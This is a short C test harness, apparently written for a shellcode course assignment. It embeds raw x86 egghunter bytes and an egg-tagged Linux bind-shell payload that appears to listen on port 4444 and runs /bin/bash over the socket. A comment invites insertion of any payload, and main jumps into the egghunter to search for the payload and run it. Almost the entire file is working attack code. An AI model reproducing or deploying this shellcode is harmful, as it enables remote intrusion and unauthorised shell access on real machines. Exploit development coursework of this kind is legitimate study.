#include <stdio.h>
#include <string.h>

unsigned char egghunter[]= \
"\xbb\x90\x50\x90\x50\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xed\x39\x1a\x75\xee\x39\x5a\x04\x75\xe9\xff\xe2";

unsigned char code[] = \
/** egg **/
"\x90\x50\x90\x50\x90\x50\x90\x50"
/*bind shell code from assignment 1. INSERT ANY PAYLOAD AFTER THIS COMMENT*/
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\xb3\x02\x52\x66\x68\x11\x5c\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb3\x04\x6a\x01\x56\x89\xe1\xb0\x66\xcd\x80\xb3\x05\x52\x52\x56\x89\xe1\xb0\x66\xcd\x80\x89\xc3\x89\xd1\xb0\x3f\xcd\x80\xb1\x01\xb0\x3f\xcd\x80\xb1\x02\xb0\x3f\xcd\x80\x52\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80";

main()
{
	printf("Egghunter Length:  %d\n", strlen(egghunter));
	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())egghunter;
	ret();
}

	
